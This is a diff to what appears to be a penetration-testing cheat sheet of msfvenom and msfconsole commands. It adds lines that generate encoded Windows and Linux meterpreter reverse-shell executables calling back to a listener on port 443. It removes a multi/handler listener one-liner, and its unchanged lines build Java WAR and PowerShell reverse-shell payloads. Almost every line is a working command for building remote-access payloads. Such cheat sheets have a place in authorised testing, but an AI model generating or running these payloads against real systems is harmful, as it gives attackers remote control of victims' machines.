@@ -6,10 +6,13 @@ msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.w
 # windows 64 reverse powershell
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -a x64 --platform windows -b '\x00' -e x64\xor_dynamic -o shell.exe
 
+# windows 64 meterpreter https
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o met.exe
+
+# linux 64 meterpreter
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf prependfork=true -t 300 -e x64/xor_dynamic -o shellme.elf
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
 
 # search payloads
 msfvenom --list payloads | grep linux | grep meterpreter | grep x64
-
-# listener handler
-msfconsole -q -x "use multi/handler; set payload <PAYLOAD>; set lhost <LHOST>; set lport <PORT>; exploit"
